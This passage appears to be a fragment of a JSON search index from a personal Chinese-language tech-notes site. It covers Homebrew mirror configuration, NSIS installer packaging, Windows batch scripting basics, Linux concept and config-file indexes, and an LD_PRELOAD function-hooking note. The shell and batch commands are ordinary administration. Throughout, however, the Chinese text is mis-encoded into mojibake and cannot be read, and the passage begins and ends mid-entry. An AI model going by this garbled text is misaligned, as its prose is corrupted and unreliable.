HOMEBREW_API_DOMAIN å³å¯ã€‚ # å¦‚æœéœ€è¦ä½¿ç”¨ Homebrew çš„å¼€å‘å‘½ä»¤ (å¦‚ `brew cat <formula>`)ï¼Œåˆ™ä»ç„¶éœ€è¦è®¾ç½® homebrew/core å’Œ homebrew/cask é•œåƒã€‚ # è¯·æŒ‰éœ€æ‰§è¡Œå¦‚ä¸‹ä¸¤è¡Œå‘½ä»¤ï¼š brew tap --custom-remote --force-auto-update homebrew/core https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git brew tap --custom-remote --force-auto-update homebrew/cask https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.git # é™¤ homebrew/core å’Œ homebrew/cask ä»“åº“å¤–çš„ tap ä»“åº“ä»ç„¶éœ€è¦è®¾ç½®é•œåƒ brew tap --custom-remote --force-auto-update homebrew/cask-fonts https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-fonts.git brew tap --custom-remote --force-auto-update homebrew/cask-versions https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-versions.git brew tap --custom-remote --force-auto-update homebrew/command-not-found https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-command-not-found.git brew tap --custom-remote --force-auto-update homebrew/services https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-services.git brew update # æˆ–ä½¿ç”¨ä¸‹é¢çš„å‡ è¡Œå‘½ä»¤è‡ªåŠ¨è®¾ç½® export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\" for tap in core cask{,-fonts,-versions} command-not-found services; do brew tap --custom-remote --force-auto-update \"homebrew/${tap}\" \"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-${tap}.git\" done brew update ä¹Ÿå¯ç›´æ¥ä½¿ç”¨ä¸Šé¢çš„é“¾æ¥å®‰è£….","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-index.html"},{"title":"é—®é¢˜","text":"MacAppææƒ XCODEå¤šç‰ˆæœ¬ macä¸€ç›´å¼¹ç™»å½•é¡¹ é—®é¢˜æ€»ç»“","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-question-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-index.html"},{"title":"nsisæ‰“åŒ…","text":"å‚è€ƒæ–‡æ¡£:: NSIS æ‰“åŒ…è„šæœ¬åŸºç¡€ NSISï¼ˆNullsoft Scriptable Install Systemï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„ Windows ç³»ç»Ÿä¸‹å®‰è£…ç¨‹åºåˆ¶ä½œç¨‹åº å¤§ä½“æµç¨‹æ˜¯: ç¼–å†™ NSIS è„šæœ¬(åç¼€ä¸º nsi çš„æ–‡ä»¶) ç¼–è¯‘æ‰“åŒ…. é»˜è®¤ä¼šæ‰“åŒ… NSIS è„šæœ¬æ‰€åœ¨ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶/ç›®å½•. å¯ä½¿ç”¨GUIç•Œé¢æˆ–è€…: /docs/æ“ä½œç³»ç»Ÿ/windows/windowsæ‰§è¡Œæ–‡ä»¶æ‰“åŒ…/nsis/makensis è¯¦æƒ… makensis nsisæŒ‡ä»¤ å†…ç½®å‡½æ•° è„šæœ¬ç»“æ„ è¯­æ³•è§„èŒƒ å¸¸ç”¨å¤´æ–‡ä»¶ ä¸€äº›å¸¸è§é”™è¯¯ å¯æ‰§è¡Œæ–‡ä»¶é€‰é¡¹ ä¸€äº›ä½¿ç”¨é—®é¢˜ã€æŠ€å·§ ä¸€äº›æ²¡æ¥å¾—åŠç»†çœ‹çš„æ–‡: NSISåˆ¶ä½œå®‰è£…åŒ…ç¬”è®° NSISä½¿ç”¨æ•™ç¨‹(å®‰è£…åŒ…åˆ¶ä½œå®‰è£…æ–‡ä»¶æ•™ç¨‹,å¦‚ä½•å°è£…æ‰“åŒ…æ–‡ä»¶) ä¸­æ–‡ç‰ˆ å…³äºNSISè„šæœ¬æ“ä½œé™é»˜å®‰è£…ç¬¬ä¸‰æ–¹ç¨‹åº+åˆ¤æ–­ç”µè„‘ä½æ•°","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-index.html"},{"title":"nsis","text":"./innosetupæ„å»ºåŒ… ./nsis","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-index.html"},{"title":"windowsæ‰§è¡Œç¨‹åºæ‰“åŒ…","text":"windowsæ‰§è¡Œæ–‡ä»¶æ‰“åŒ…","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-program-packaging.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-program-packaging.html"},{"title":"Windows","text":"Windowsæ‰“å¼€Debiané—®é¢˜ windows_shell windows_shellç¬¦å· windowsç¨‹åºæ‰“åŒ… windowsä¸‹å…³æœºç¨‹åºæ­£åœ¨è¿è¡Œé—®é¢˜ å…³äºå®‰å“æ¨¡æ‹Ÿå™¨ä¸WSLå†²çª","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-index.html"},{"title":"windows shell","text":"æœ‰ä¸€ç¯‡æ€»ç»“è¿˜å¯ä»¥çš„: Windows æ‰¹å¤„ç†å‘½ä»¤æ•™ç¨‹ï¼ˆä¸è¿½æ±‚çœ‹å®Œï¼Œåªè¦æ±‚çœ‹æ‡‚ï¼‰ å˜é‡ ä¸linuxä½¿ç”¨ $ ä¸åŒ, windows ä½¿ç”¨åŒ % å¼•ç”¨æ¥è¡¨ç¤ºå˜é‡, å¦‚aå˜é‡: %a% æ‰¹å¤„ç†æœ‰ä¸€ä¸ªå˜é‡å»¶è¿Ÿæœºåˆ¶, å¯ä»¥é€šè¿‡è®¾ç½® å˜é‡å»¶è¿Ÿæ‹“å±•(å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•) æ¥å¤„ç†: setlocal enabledelayedexpansion å¦‚: @echo off set a=4 set a=5&echo %a% pause çš„ç»“æœæ˜¯ 4 è€Œ: @echo off setlocal enabledelayedexpansion set a=4 set a=5&echo !a! pause çš„ç»“æœæ˜¯ 5 æ³¨è§£ å¼€å¯äº†å˜é‡å»¶è¿Ÿæ‹“å±•å¯ä»¥æŒ‰ç…§æ­£å¸¸çš„ç¼–ç æµç•…æ¥ç¼–ç , ä¸è¿‡æ³¨æ„å˜é‡å®šä¹‰ä¸ºä½¿ç”¨ ä¸¤ä¸ª ``!`` åŒ…è£¹ å¦å¤–, åœ¨ cmdçª—å£ ä¸­ï¼Œforä¹‹åçš„å½¢å¼å˜é‡Iå¿…é¡»ä½¿ç”¨å•ç™¾åˆ†å·å¼•ç”¨ï¼Œå³ %I ; è€Œåœ¨ æ‰¹å¤„ç†æ–‡ä»¶ ä¸­ï¼Œå¼•ç”¨å½¢å¼å˜é‡Iå¿…é¡»ä½¿ç”¨åŒç™¾åˆ†å·ï¼Œå³ %% echo æ‰“å°å˜é‡: echo %APPDATA% æˆ–è€…ä½¿ç”¨ @echo , åŒºåˆ«æ˜¯ åŠ äº† @ ä¸ä¼šæ˜¾ç¤ºè¿™æ¡å‘½äº†æœ¬èº« å‡ ç§echo: echo off æ¥ä¸‹æ¥çš„å‘½ä»¤(ä¸åŒ…æ‹¬å½“å‰å‘½ä»¤),åªæ‰“å°ç»“æœ,ä¸æ‰“å°å‘½ä»¤. @ECHO OFF æ¥ä¸‹æ¥çš„å‘½ä»¤(åŒ…æ‹¬æœ¬å‘½ä»¤)ï¼Œåªæ‰“å°æ‰§è¡Œç»“æœï¼Œä¸æ‰“å°å‘½ä»¤æœ¬èº« ECHO ON æ¥ä¸‹æ¥çš„å‘½ä»¤(ä¸åŒ…æ‹¬æœ¬å‘½ä»¤)ï¼Œæ‰§è¡Œå‘½ä»¤å‰ä¼šå…ˆæŠŠå‘½ä»¤æ‰“å°å‡ºæ¥ åœ¨æ‰¹å¤„ç†æ–‡ä»¶ä¸­ï¼Œå¦‚æœå‘½ä»¤å‰åŠ @ï¼Œè¡¨ç¤ºè¿™æ¡å‘½ä»¤ä¸æ‰“å°å‡ºæ¥ï¼ŒåªæŠŠç»“æœæ‰“å°å‡ºæ¥ï¼Œå³@æ˜¯å…³é—­å‘½ä»¤æœ¬èº«çš„å›æ˜¾ æ³¨é‡Š :: åœ¨æ‰¹å¤„ç†ä¸­è¡¨ç¤ºæ³¨é‡ŠæŸä¸€è¡Œ: :: è¿™æ˜¯æ³¨é‡Šä¿¡æ¯ ä¹Ÿå¯ä»¥ä½¿ç”¨ rem, åŒºåˆ«æ˜¯ rem æ”¯æŒå›æ˜¾: rem è¿™æ˜¯æ”¯æŒå›æ˜¾çš„æ³¨é‡Šä¿¡æ¯ æ•°å€¼èŒƒå›´ ç±»ä¼¼äº Python çš„ range å§, ä½¿ç”¨: /L (start,step,end) step=<end ä¹Ÿå«å¼€å…³(æ­¤å¤„å¤§å°å†™ä¸æ•æ„Ÿ), ä¾‹: setlocal enabledelayedexpansion for /l %%1 in (1, 1, 10) do( set \"k=%%1\" echo !k! ) è·å–å‘½ä»¤è¡Œå‚æ•° çº¦å®š: è·å¾—ç¬¬iä¸ªå‚æ•°ï¼š%iï¼Œ0<=i && i <=å‚æ•°æœ€å¤§æ•°é‡ æ¡ä»¶åˆ¤æ–­ ifæ¡ä»¶åˆ¤æ–­, å˜é‡ l æ˜¯å¦å·²ç»èµ‹å€¼: if defined l( echo \"å·²èµ‹å€¼l\" )else( echo \"æœªèµ‹å€¼l\" ) æ”¯æŒ not: if not defined xxx ä¸ æˆ– éçš„å®ç°: ä¸(and): if 1==1 if 2==2 echo Ok :: if 1==1 (if 2==2 echo Ok) æˆ–(or), è¿™é‡Œåªè°ˆæœ€ä¾¿æ·çš„ goto: if \"%1\"==\"\" goto printHelp if \"%2\"==\"\" goto printHelp :printHelp @echo This is a help message, please refere to ... é(not): if not 1==1 echo OK å¾ªç¯ forå¾ªç¯, è¯­æ³•: for å¾ªç¯æ¡ä»¶ do ( å†…å®¹ ) åœ¨cmdçª—å£ä¸­: for %I in (command1) do command2 åœ¨æ‰¹å¤„ç†æ–‡ä»¶ä¸­: for %%I in (command1) do command2 é«˜çº§ä½¿ç”¨ , å¯»æ‰¾æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶(ä¸å¯»æ‰¾å…¶ä¸‹å­ç›®å½•), ä½†æ˜¯æ’é™¤æŒ‡å®šå†…å®¹: @echo off set home=C:\\Users set exclude_list=\"_ video music image img.png ttt.py\" for /f \"delims=*\" %%i in ('dir /b %home% &#94;| findstr /v /i /x %exclude_list%') do ( echo %home%\\\"%%i\" rem rd /s %home%\\\"%%i\" ) ç®€å•è¯´æ˜, for ä¸­ä½¿ç”¨ å•å¼•å· åŒ…è£¹è¡¨ç¤ºéœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤, è¿™æ—¶ç®¡é“éœ€è¦åŠ  &#94; è½¬ä¹‰ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/dir : /b è¡¨ç¤ºå€¼åˆ—å‡ºç›®å½•/æ–‡ä»¶ å­—ç¬¦ä¸²; å¯åŠ  /s é€’å½’æŸ¥æ‰¾ä¸‹é¢æ‰€æœ‰å­ç›®å½• /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/findstr : /v åå‘åŒ¹é…; /i å¿½ç•¥å¤§å°å†™; /x å…¨è¯åŒ¹é… è¿æ¥ç¬¦å· è¿æ¥ç¬¦å·æœ‰: ; & && | || ; é¡ºåºæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œè€Œä¸ç®¡å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸ. & ä¸ä¸Šç­‰åŒ. bashä¸­æŸæ¡å‘½ä»¤åé¢è·Ÿä¸Š &, ç”¨æ¥å°†å‘½ä»¤è‡³äºåå°æ‰§è¡Œï¼Œé¿å…å…¶å ç”¨å‘½ä»¤è¡Œ && é¡ºåºæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå½“ç¢°åˆ°æ‰§è¡Œå‡ºé”™çš„å‘½ä»¤åå°†ä¸æ‰§è¡Œåé¢çš„å‘½ä»¤ | ç®¡é“å‘½ä»¤ || é¡ºåºæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå½“ç¢°åˆ°æ‰§è¡Œæ­£ç¡®çš„å‘½ä»¤åå°†ä¸æ‰§è¡Œåé¢çš„å‘½ä»¤ ç®¡é“ ä¸ linux ä¸‹ | è¡¨ç¤ºç®¡é“ä¸€èˆ¬æƒ…å†µä¸‹ä¸€è‡´, ä½†æ˜¯åœ¨ for å¾ªç¯ä¸­éœ€è¦ä½¿ç”¨ &#94; è¿›è¡Œ è½¬ä¹‰ , å³ &#94;| è¡¨ç¤ºç®¡é“ æœ‰ä¸€ç§è¯´æ³•è§£é‡Šè§: æ˜¯ä¸æ˜¯åªæœ‰forçš„('')ä¸­çš„ç‰¹æ®Šå­—ç¬¦å‰å¿…é¡»è¦ç”¨&#94;å¯¹å…¶è½¬ä¹‰ æˆ‘çœ‹è¿‡&#94;ä¸æ˜¯åœ¨è¦è¾“å‡ºç‰¹æ®Šå­—ç¬¦æ‰ç”¨&#94; å¤§æ¦‚æ„æ€æ˜¯, åœ¨forå¾ªç¯ä¸­, å¦‚æœä¸è¿›è¡Œè½¬ä¹‰, å¦‚: for /f \"delims=*\" %%i in ('dir /b %home% | findstr /v /i /x %exclude_list%') ä¼šæŠŠå‰é¢çš„æ‰€æœ‰, å³: for /f \"delims=*\" %%i in ('dir /b %home% å½“æˆä¸€ä¸ªæŒ‡ä»¤, ä½†ä½ åˆæ²¡æœ‰è¿™ä¸ªæŒ‡ä»¤, æ‰€ä»¥éœ€è¦è½¬ä¹‰. ç¨‹åºè¿”å›ç  å˜é‡errorlevel: %errorlevel% å¯ä»¥é€šè¿‡å…¶å€¼åˆ¤æ–­ä¸Šä¸€ä¸ªæŒ‡ä»¤æ˜¯å¦æ­£å¸¸æ‰§è¡Œ(æ­£å¸¸ä¸º0). ç›¸å½“äº linux çš„ $? åˆ¤æ–­æ˜¯æ–‡ä»¶/ç›®å½• åˆ¤æ–­æ˜¯æ–‡ä»¶/ç›®å½•: if exist \"%%i\" ( if exist \"%%i\\*\" ( echo \"%%i is a folder\" ) else ( echo \"%%i is a file\" ) ) æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯: command /? è·¯å¾„æ‹¼æ¥å¼•å·é—®é¢˜ å¼•å·ä»‹ç»: batè„šæœ¬ä¸­å•å¼•å·(')æ˜¯æ— æ•ˆçš„ï¼Œå¿…é¡»ä½¿ç”¨åŒå¼•å·(\")æ¥å®šä¹‰å­—ç¬¦ä¸²ã€‚ åœ¨batè„šæœ¬ä¸­ï¼ŒåŒå¼•å·å’Œç©ºæ ¼éƒ½éœ€è¦è¿›è¡Œè½¬ä¹‰å¤„ç† å®šä¹‰å˜é‡æ—¶, å•å¼•å·åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²æ˜¯ä¸ä¸€æ ·çš„, ä¸è¿‡åœ¨batè„šæœ¬å†…éƒ¨å®šä¹‰æ—¶å€™, å¯ä»¥ä¸åŠ ä»»ä½•å¼•å·è¡¨ç¤ºä¸€ä¸ªå˜é‡ ä¸€èˆ¬å•å¼•å·åªç”¨äº for å¾ªç¯çš„æ—¶å€™å¤„ç†å‘½ä»¤; åŒå¼•å·çš„è¯, ä¸¾ä¸ªä¾‹å­, å¦‚æœbatè„šæœ¬éœ€è¦ä¼ é€’åŒ…å«ç©ºæ ¼çš„è·¯å¾„å‚æ•°, é‚£ä¹ˆä¸ºäº†é¿å…ç©ºæ ¼æŠŠå‚æ•°åˆ†éš”, æ¯”å¦‚æœ¬æ¥æ˜¯è·¯å¾„æ˜¯å‚æ•°1: set app_path=%1 ä½†æ˜¯ç”±äºå­˜åœ¨ç©ºæ ¼, æ¯”å¦‚: C:/user/ho me ä½ åˆæ²¡æœ‰åœ¨å‘½ä»¤è¡Œè°ƒç”¨æ—¶åŠ å¼•å·: xxx.bat C:/user/ho me é‚£ä¹ˆæœ€ç»ˆè·å–çš„å‚æ•°å°±æ˜¯(ä¸å¸¦å¼•å·): C:/user/ho è€Œå½“ä½¿ç”¨: xxx.bat \"C:/user/ho me\" å¾—åˆ°çš„ç»“æœåˆä¸º(å¸¦å¼•å·): \"C:/user/ho me\" ä¸å¸¦å¼•å·å¯èƒ½ä¼šå¼•èµ·è·¯å¾„ä¸¢å¤±çš„é—®é¢˜, å¸¦å¼•å·å¯èƒ½ä¼šå¼•èµ·åé¢å‚æ•°æ‹¼æ¥æ—¶å€™è·¯å¾„ä¸å¯ç”¨é—®é¢˜ å¸¦å¼•å·æ—¶å‡ºç°é—®é¢˜, å¯ä»¥ä»ä¸¤ä¸ªæ–¹æ¡ˆå¤„ç†: æ–¹æ¡ˆ1: åé¢å®šä¹‰çš„å…¶ä»–éƒ¨åˆ†çš„è·¯å¾„ä¹ŸåŠ å¼•å· , å¦‚: rem æ¥å—å‚æ•°çš„æ—¶å€™å°±ä¸è¦åŠ å¼•å·äº† set app_path=%1 rem å®šä¹‰ä¸€ä¸ªå¸¦ä¸€ä¸ªå¼•å·çš„è·¯å¾„ set tmp_path=\"_\" set new_path=%app_path%\\%tmp_path% è¿˜æ˜¯ä»¥ä¸Šé¢çš„è·¯å¾„ä¸ºä¾‹, ä¼ å…¥çš„è·¯å¾„ä¸º \"C:/user/ho me\" , æœ€åçš„æ‹¼æ¥ç»“æœä¸º: \"C:/user/ho me\"/\"_\" è¿™ä¸ªæ—¶å€™è™½å­˜åœ¨å¼•å·, ä½†æ˜¯å„éƒ¨åˆ†éƒ½æ˜¯ç‹¬ç«‹çš„, å¯ä»¥è¢«ç³»ç»Ÿè¯†åˆ«æ­¤è·¯å¾„ è‡³äºæ˜¯ä¸æ˜¯å¤šå±‚ç‹¬ç«‹çš„å¼•å·ä¹Ÿå¯ä»¥è¯†åˆ«, æ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±è¯•è¯•: \"\"C:/user/ho me\"\"/\"\"_\"\" æ–¹æ¡ˆäºŒ: å»æ‰æ‰€æœ‰çš„å¼•å· , è¿™ä¸ªå¯èƒ½ä¼šæœ‰å…¶ä»–çš„é—®é¢˜, å¦‚æ–‡ä»¶å¦‚æœåŒ…å«å¼•å·æ€ä¹ˆå¤„ç†? ä½†æ˜¯ä¸€èˆ¬äººä¸ä¼šè¿™ä¸ªèµ·å. å»é™¤å˜é‡çš„å¼•å·: set var=%var:\"=% å¦‚: set p=\"C:/user/ho me\"/\"_\" echo %p% set p=%p:\"=% echo %p% è¾“å‡º: \"C:/user/ho me\"/\"_\" C:/user/ho me/_ å¯¹äºWindowsä¸‹è·¯å¾„è€Œè¨€ æ‰¹å¤„ç†ç¨‹åºåˆ é™¤è‡ªå·± ä¸€èˆ¬æ¥è¯´ç›´æ¥åˆ é™¤å°±è¡Œ: :: ä¸€äº›å…¶ä»–ä»£ç  del %0 ä½†æ˜¯æœ‰æ—¶å€™æŒ‡ä»¤ä¼šæ›´æ–°æ‰€åœ¨è·¯å¾„, æ¯”å¦‚: move . tmp\\ è¿™æ—¶å€™å¯ä»¥åˆ©ç”¨ç®¡é“: del %0 | move . tmp\\ è¾“å‡ºé‡å®šå‘ å°†é”™è¯¯è¾“å‡º, æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ° 1.txt æ³¨æ„é¡ºåºä¸èƒ½é”™ è¾“å‡ºé‡å®šå‘: t.bat >1.txt 2>&1 è·¨ç›˜ç§»åŠ¨çš„å‘ ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/move è·¨ç›˜ç§»åŠ¨æ–‡ä»¶å¤¹æ—¶, ä¼šæŠ¥é”™ æ‹’ç»è®¿é—® ç®¡ç†å‘˜æƒé™ä¹Ÿæ— æ³•. ç›®å‰æ‰€çŸ¥çš„è§£å†³æ–¹æ¡ˆåªæœ‰å…ˆå¤åˆ¶è¿‡å»ç„¶ååˆ é™¤: xcopy /H /E /Y åŸæœ‰çš„æ–‡ä»¶å¤¹ ç§»åŠ¨åˆ°çš„æ–‡ä»¶å¤¹ rd /s /q åŸæœ‰çš„æ–‡ä»¶å¤¹ è·å–ç»å¯¹è·¯å¾„æ–‡ä»¶å å¦‚æœè·¯å¾„ä¸æ˜¯ä¼ å…¥çš„å‚æ•°, é‚£ä¹ˆéœ€è¦ä½¿ç”¨ç±»ä¼¼å‡½æ•°çš„æ–¹å¼: @echo off echo ç›˜ç¬¦: %~dp0 echo å½“å‰è„šæœ¬è·¯å¾„: %~dp0 echo å‚æ•°1ç›˜ç¬¦: %~dp1 echo å‚æ•°1å½“å‰è„šæœ¬è·¯å¾„: %~dp1 echo å‚æ•°1æ–‡ä»¶åç§°: %~n1 set p1=C:\\Users\\tt\\1.txt echo %p1% call :get_base_name %p1% goto :eof :get_base_name set file_path=%~dp1 echo %file_path% rem è·å–åˆ°æ–‡ä»¶åç§° set file_name=%~n1 echo %file_name% rem è·å–åˆ°æ–‡ä»¶åç¼€ set suffix=%~x1 echo %suffix% goto :eof è·å–ç”¨æˆ·å code: %username% ifä¸å¾ªç¯ ifè¯­å¥ä¸èƒ½åŒ…å«å¾ªç¯è¯­å¥, ä¸è¿‡å¯ä»¥ä½¿ç”¨gotoå¤„ç†: @echo off set var=hello if \"%var%\"==\"hello\" goto loop goto end :loop echo doing something... goto loop_end :loop_end echo done goto end :end æŒ‡ä»¤ ./windows_shell","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell.html"},{"title":"Windows Shell","text":"assoc attrib call cd certutil color copy del dir exit find findstr for ftype goto if ipconfig mklink mode move net pause popd pushd rmdir set setlocal shift start taskkill tasklist title tskill where wimic xcopy","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-index.html"},{"title":"å†…ç½®å‡½æ•°","text":"dup dup2 fork getcwd wait","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-index.html"},{"title":"è§£é‡Šå™¨æ‰§è¡Œé¡ºåº","text":"æš‚ä¸”åªè°ˆ Linux ä¸‹çš„ bash/dash, ä»¥åŠPython. shè„šæœ¬, å¤§å¤šä¼šåœ¨æ–‡ä»¶å¤´å®šä¹‰: #!/bin/bash Pythonè„šæœ¬æœ‰äº›ä¹Ÿä¼šåœ¨æ–‡ä»¶å¤´å®šä¹‰: #/usr/bin/python3 è¿™äº›è§£é‡Šå™¨çš„æ‰§è¡Œé¡ºåºä¸º æ–‡ä»¶å¤´å®šä¹‰çš„è§£é‡Šå™¨, è‹¥å®šä¹‰äº†ä¸Šé¢ç±»å‹çš„æ–‡ä»¶å¤´, å³ä½¿æ˜¯ä½¿ç”¨æ—¶æŒ‡å®š, ä¹Ÿæ— æ•ˆ, å¦‚ bash 1.sh , è¿˜æ˜¯ä¼šä½¿ç”¨æ–‡ä»¶å¤´çš„å®šä¹‰ å®é™…æ‰§è¡Œæ—¶ä½¿ç”¨çš„è§£é‡Šå™¨, æ¯”å¦‚ bash 1.sh , å½“è„šæœ¬å†…æ²¡æœ‰å®šä¹‰è¿™æ ·çš„æ–‡ä»¶å¤´æ—¶, ä½¿ç”¨æ‰§è¡Œæ—¶æŒ‡å®šçš„ bash è™šæ‹Ÿç³»ç»Ÿç¯å¢ƒé»˜è®¤è§£é‡Šå™¨ (ç›´æ¥ä½¿ç”¨æ–‡ä»¶æ‰§è¡Œ, ä»…é™äºPython, æ–‡ä»¶éœ€æœ‰å¯æ‰§è¡Œæƒé™), å¦‚ ./1.py ç³»ç»Ÿç¯å¢ƒé»˜è®¤è§£é‡Šå™¨ (ç›´æ¥ä½¿ç”¨æ–‡ä»¶æ‰§è¡Œ, æ–‡ä»¶éœ€æœ‰å¯æ‰§è¡Œæƒé™), å¦‚ ./1.sh","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Interpreter-execution-order.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Interpreter-execution-order.html"},{"title":"æ¦‚å¿µæ€§","text":"linuxåˆ é™¤æœºåˆ¶ IOæ¨¡å‹ elfæ–‡ä»¶ ç»ˆç«¯ tty consoleåŒºåˆ« Linuxç³»ç»Ÿçš„å¯åŠ¨è¿‡ç¨‹ linuxç³»ç»Ÿç¯å¢ƒåŠ è½½é¡ºåº linuxç³»ç»Ÿä¿¡å· linuxä¸‹æ–‡ä»¶æƒé™ä½ sudoä¸suçš„éƒ¨åˆ†è¯´æ˜ æŒ‡ä»¤exportã€envã€setä¸‰è€…çš„åŒºåˆ« é‡å®šå‘ åˆ¶è¡¨ç¬¦ é¢œè‰²è¡¨ä¸ä»£ç è¡¨ ç‰¹æ®Šçš„æƒé™ä½ shellç±»å‹ shellæ‹¬å· fstab æ–‡ä»¶ç³»ç»Ÿè¯¦è§£ ç‰¹æ®Šç¬¦å· è§£é‡Šå™¨æ‰§è¡Œé¡ºåº","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-index.html"},{"title":"é…ç½®æ–‡ä»¶","text":"æœ‰äº›ä¸œè¥¿æ—¶é—´ä¸€é•¿å°±å¿˜äº†, æƒ³åŠå¤©ä¹Ÿä¸ä¸€å®šèƒ½æƒ³èµ·æ¥, æ•…è¿˜æ˜¯è®°å½•ä¸€ä¸‹å§. /etc/hosts æŸ¥çœ‹æœ¬åœ°åŸŸåä¸åœ°å€æ˜ å°„, å†…å®¹ä¸º åœ°å€ä¸åŸŸåçš„æ˜ å°„, å‚è§: etc-hosts /etc/resolv.conf é…ç½®æœ¬æœºä½¿ç”¨dnsæœåŠ¡å™¨, ä»¥nameserverå¼€å¤´, å¯å¤šè¡Œ. å‚è§: etc-resolv-conf /etc/hostname è®¾ç½®å½“å‰ä¸»æœºå, å¯é€šè¿‡ hostnamectl ä¿®æ”¹, é‡å¯ç”Ÿæ•ˆ etc-hosts etc-resolv-conf bashçš„é…ç½®æ–‡ä»¶ æŒä¹…ä¿å­˜ç”¨æˆ·é…ç½® profileç±» ä¸ºäº¤äº’å¼ç™»é™†ç”¨æˆ·æä¾›é…ç½® åŠŸèƒ½ï¼šè®¾å®šç¯å¢ƒå˜é‡ï¼Œè¿è¡Œå‘½ä»¤æˆ–è„šæœ¬: /etc/profile #å…¨å±€ /etc/profile.d/*.sh #å…¨å±€ ~/.bash_profile #ä¸ªäººé…ç½®ï¼Œå½“å‰ç”¨æˆ·æœ‰æ•ˆ bashrcç±» éäº¤äº’å¼ç™»é™†ç”¨æˆ·æä¾›é…ç½® åŠŸèƒ½ï¼šè®¾å®šæœ¬åœ°å˜é‡ï¼Œå®šä¹‰å‘½ä»¤åˆ«å: /etc/bashrc #å…¨å±€ ~/.bashrc #ä¸ªäºº","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Configuration-file-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Configuration-file-index.html"},{"title":"LD_PRELOAD","text":"å¯ä»¥ç”¨æ¥æ‰§è¡Œç¨‹åºè¿è¡Œå‰é¦–å…ˆåŠ è½½çš„åŠ¨æ€åº“, å¤šä¸ªä½¿ç”¨å†’å·åˆ†å‰², ä¸Macçš„ /docs/æ“ä½œç³»ç»Ÿ/Mac/Macç¯å¢ƒå˜é‡/DYLD_INSERT_LIBRARIES åŸºæœ¬ä¸€è‡´ ç”¨ä¾‹: /docs/å®‰å…¨/é€†å‘å·¥ç¨‹/å®æˆ˜-Ubuntu16ä¸‹Hookç³»ç»Ÿçš„open LD_PRELOADæŒ‡å®šçš„åŠ¨æ€åº“å¦‚æœä¸å…¶ä»–çš„åŠ¨æ€åº“æœ‰åŒåå‡½æ•°, åˆ™ä¼šè¦†ç›–æ‰åè€…çš„è°ƒç”¨ å¯ä»¥ä½¿ç”¨ dlsym æ¥è‡ªå·±é‡è°ƒç”¨åç»­çš„åŒåå‡½æ•°: dlsym(RTLD_NEXT,\"å‡½æ•°å\"); æ³¨è§£ dlsym çš„å¤´æ–‡ä»¶æ˜¯ <dlfcn.h> , ä¾èµ–äº: libdl.so å¦‚æœæ²¡æœ‰éœ€è¦å…ˆå®‰è£…: apt install libc6-dev ç¼–è¯‘çš„æ—¶å€™å¦‚æœæ‰¾ä¸åˆ°: gcc -ldl ...","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Ld_preload.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Ld_preload.html"},{"title":"Linuxç¯å¢ƒå˜é‡","text":"LD_PRELOAD DISPLAY PS1 